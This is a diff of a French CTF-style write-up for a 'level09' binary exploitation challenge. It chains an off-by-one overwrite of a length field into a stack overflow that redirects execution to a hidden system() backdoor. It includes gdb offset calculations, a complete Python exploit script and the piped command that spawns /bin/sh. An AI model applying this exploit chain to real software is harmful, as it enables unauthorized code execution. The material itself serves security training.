@@ -1,12 +1,14 @@
 # Level09
 
-Exploiter un off-by-one overflow pour modifier une var len, permettant ensuite un buffer overflow qui redirige l'exécution vers secret_backdoor().
+## Objectif
+
+Exploiter un off by one overflow pour modifier une variable de taille, permettant ensuite un buffer overflow qui redirige l'execution vers secret_backdoor()
 
 ## Analyse du programme
 
-### Exécution normale
+### Execution normale
 
-```bash
+```
 ./level09
 >: Enter your username
 >>: test
@@ -16,146 +18,164 @@ Exploiter un off-by-one overflow pour modifier une var len, permettant ensuite u
 >: Msg sent!
 ```
 
+Le programme demande un username puis un message
+
 ### Fonctions disponibles
 
-```bash
+```
 (gdb) info functions
-0x000055555555488c  secret_backdoor    ← Jamais appelée 
+0x000055555555488c  secret_backdoor
 0x00000000000008c0  handle_msg
 0x0000000000000932  set_msg
 0x00000000000009cd  set_username
 ```
 
-### Analyse de `secret_backdoor()`
+Il existe une fonction secret_backdoor() qui n'est jamais appelee
 
-```bash
+### Code de secret_backdoor()
+
+```
 (gdb) disas secret_backdoor
 ```
 
-```c
-void secret_backdoor() {
-    char buffer[128];
-    fgets(buffer, 128, stdin);    // Lit notre input
-    system(buffer);                // L'exécute 
-}
-```
+En analysant l'assembleur on voit que cette fonction:
+- Lit notre input avec fgets()
+- Execute notre input avec system()
 
-- objectif: atteindre cette fonction.
+Notre objectif est de faire sauter le programme vers cette fonction
 
 ## Reconstruction du code
 
-### Structure de données
+### Structure de donnees
 
-- En analysant `handle_msg()` avec GDB, on identifie:
+En analysant handle_msg() on identifie une structure qui stocke les donnees:
 
-```c
+```
 typedef struct s_message {
-    char text[140];      // 0x8c bytes
-    char username[40];   // 0x28 bytes  
-    int len;             // 4 bytes (initialisé à 140)
+    char text[140];
+    char username[40];
+    int len;
 } t_message;
 ```
 
-### Fonction `set_username()`:
+Cette structure est creee sur la pile dans handle_msg()
 
-```c
-void set_username(t_message *message) {
+### Fonction set_username()
+
+```
+void set_username(t_message *msg) {
     char buffer[128];
     fgets(buffer, 128, stdin);
     
-    for (int i = 0; i <= 40; i++) {    // bug: i <= 40 au lieu de i < 40
-        message->username[i] = buffer[i];
+    for (int i = 0; i <= 40; i++) {
+        msg->username[i] = buffer[i];
     }
 }
 ```
 
-- Faille : La boucle fait 41 itérations au lieu de 40 → off-by-one overflow
+Bug identifie: la boucle fait 41 iterations au lieu de 40
 
-### Fonction `set_msg()`:
+### Fonction set_msg()
 
-```c
-void set_msg(t_message *message) {
+```
+void set_msg(t_message *msg) {
     char buffer[1024];
     fgets(buffer, 1024, stdin);
-    strncpy(message->text, buffer, message->len);  // Utilise len
+    strncpy(msg->text, buffer, msg->len);
 }
 ```
 
-- `strncpy` copie `message->len` bytes (normalement 140)
+Cette fonction utilise msg->len pour savoir combien de bytes copier
 
-## plan d'exploitation étape par étape
+## La chaine d'exploitation
 
-### Étape 1 : Disposition mémoire:
+### Etape 1: Comprendre la disposition memoire
+
+Quand handle_msg() s'execute, voici comment la pile est organisee:
 
 ```
-Stack de handle_msg() :
-─────────────────────────────
-rbp - 0xc0  : text[140]
-rbp - 0x2c  : username[40]
-rbp - 0x04  : len (4 bytes)    ← suit username 
-rbp         : saved rbp
-rbp + 0x08  : saved RIP         ← cible (Return address)
+text[140]
+username[40]
+len (4 bytes)
+Ancien pointeur de base
+Adresse de retour (la ou le programme doit revenir)
 ```
 
-### Étape 2 : Off-by-one pour modifier len:
+La variable len est juste apres username[] en memoire
+L'adresse de retour est 200 bytes apres le debut de text[]
 
-- Avec 41 caractères en input :
+### Etape 2: Exploiter l'off-by-one
+
+On envoie 41 caracteres au lieu de 40:
+
+```
+Input: "A" * 40 + "\xd0"
+```
+
+Le 41eme caractere (valeur 208 en decimal) ecrase le premier byte de len
+
+Resultat: len passe de 140 a 208
+
+Pourquoi 208: on a besoin de 200 bytes pour atteindre l'adresse de retour plus 8 bytes pour ecrire la nouvelle adresse
+
+### Verification avec GDB
 
 ```bash
-Input : "A" * 40 + "\xd0"
+(gdb) break *handle_msg+85
+(gdb) run
+(gdb) print $rbp
+Adresse affichee: 0x7fffffffe590
 
-Résultat :
-username[0-39] = 'A'
-len = 0x000000d0 (208)   ← Écrasé de 140 → 208 
+(gdb) print $rbp - 0xc0
+Adresse de text[]: 0x7fffffffe4d0
+
+(gdb) print $rbp + 8
+Adresse de retour: 0x7fffffffe598
+
+(gdb) print 0x7fffffffe598 - 0x7fffffffe4d0
+Distance en bytes: 200
 ```
 
-- Pourquoi `\xd0` (208) ?
+### Etape 3: Buffer overflow vers l'adresse de retour
 
-- Calcul de la distance de text[] à saved RIP:
+Maintenant que len vaut 208, strncpy() va copier 208 bytes au lieu de 140
 
-```bash
-(gdb) p/d (0x7fffffffe598) - (0x7fffffffe4d0)
-$1 = 200
+On envoie:
+```
+"B" * 200 + adresse_de_secret_backdoor
 ```
 
-- On a besoin de 200 bytes de padding + 8 bytes d'adresse = 208 bytes minimum
+Les 200 premiers bytes remplissent tout l'espace jusqu'a l'adresse de retour
+Les 8 bytes suivants ecrasent l'adresse de retour avec l'adresse de secret_backdoor()
 
-### Étape 3 : Buffer overflow vers RIP (Return address):
+### Conversion de l'adresse en bytes
 
-- Maintenant len = 208, donc strncpy peut copier 208 bytes:
+On ne peut pas ecrire directement 0x55555555488c car ce sont des caracteres texte
 
-```bash
-Input : "B" * 200 + struct.pack('Q', 0x55555555488c)
+On utilise struct.pack() pour convertir le nombre en 8 bytes:
 
-Résultat :
-text[] rempli de 'B', déborde jusqu'à
-saved RIP = 0x55555555488c  ← Adresse de secret_backdoor()
+```
+adresse = struct.pack('Q', 0x55555555488c)
 ```
 
-- Quand handle_msg() retourne :
-1. L'instruction `ret` lit `saved RIP`
-2. Au lieu de retourner à `main()`, le CPU saute à secret_backdoor()
+Cela convertit 0x55555555488c en 8 bytes que la memoire peut lire comme une adresse
 
-### Étape 4 : Exécution de commande:
+### Etape 4: Redirection d'execution
 
-- secret_backdoor() exécute fgets() puis system() avec notre input → on lui donne `/bin/sh`
+Quand handle_msg() termine:
+- Le programme lit l'adresse de retour sur la pile
+- Au lieu de retourner a main(), il saute a secret_backdoor()
+- secret_backdoor() execute fgets() puis system() avec notre commande
 
-## Exploitation
+## Script d'exploitation
 
-### Script Python
-
-```python
+```
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 import struct
 
-# Étape 1 : Modifier len (140 → 208)
 username = "A" * 40 + "\xd0"
-
-# Étape 2 : Overflow jusqu'à RIP (return addr) et l'écraser
 message = "B" * 200 + struct.pack('Q', 0x55555555488c)
-
-# Étape 3 : Commande pour secret_backdoor
 command = "/bin/sh"
 
 print(username)
@@ -163,46 +183,24 @@ print(message)
 print(command)
 ```
 
-- pour struct.pack('Q', ...):
-	- Convertit l'adresse en 8 bytes little-endian
-	- `0x55555555488c` → `\x8c\x48\x55\x55\x55\x55\x00\x00`
+Le script genere 3 lignes:
+- Ligne 1: pour set_username() qui modifie len
+- Ligne 2: pour set_msg() qui ecrase l'adresse de retour
+- Ligne 3: pour secret_backdoor() qui execute la commande
 
-### Génération et exécution
+## Execution de l'exploit
 
-```bash
+### Generation du payload
+
+```
 python exploit.py > payload
-(cat payload; cat) | ./level09
 ```
 
-- Pourquoi (cat payload; cat)?
+### Exploitation finale
 
-Le programme fait 3 appels à fgets():
-1. set_username() → lit ligne 1
-2. set_msg() → lit ligne 2  
-3. secret_backdoor() → doit lire notre commande
-
-- Le deuxième cat garde stdin ouvert pour qu'on puisse interagir avec le shell
-
-- Sans le deuxième cat:
-```bash
-cat payload | ./level09
-└→ Envoie le payload puis ferme stdin (EOF)
-   └→ secret_backdoor() reçoit EOF
-      └→ system("") ne fait rien
 ```
-
-- avec le deuxième cat:
-```bash
 (cat payload; cat) | ./level09
-                └→ Attend notre input (stdin reste ouvert)
-                   └→ secret_backdoor() peut lire "/bin/sh"
-```
-
-### Résultat
-
-```bash
-(cat payload; cat) | ./level09
->: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 >: Msg sent!
 whoami
 end
